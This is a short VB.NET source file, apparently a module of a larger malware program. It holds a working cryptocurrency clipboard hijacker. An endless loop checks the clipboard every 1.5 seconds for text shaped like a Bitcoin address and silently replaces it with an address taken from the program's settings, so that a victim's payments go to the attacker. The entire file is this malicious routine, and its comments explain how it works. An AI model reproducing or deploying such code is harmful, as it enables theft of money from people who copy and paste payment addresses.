Public Class BTC


    Public Shared Sub _BTC_ST()

        While True 'Infinity loop
            Try

                Threading.Thread.CurrentThread.Sleep(1500) 'sleep to reduce cpu usage

                'check if clipboard contains bitcoin address, the address always starts with 1 or 3 or bc1
                'the length is between 26-35 characters
                'more info https://en.bitcoin.it/wiki/Address

                If My.Computer.Clipboard.GetText.Length >= 26 AndAlso My.Computer.Clipboard.GetText.Length <= 35 Then
                    If My.Computer.Clipboard.GetText.StartsWith("1") Or My.Computer.Clipboard.GetText.StartsWith("3") Or My.Computer.Clipboard.GetText.StartsWith("bc1") Then
                        My.Computer.Clipboard.SetText(Settings.BTC_ADDR)
                    End If
                End If
            Catch ex As Exception
            End Try
        End While

    End Sub

End Class
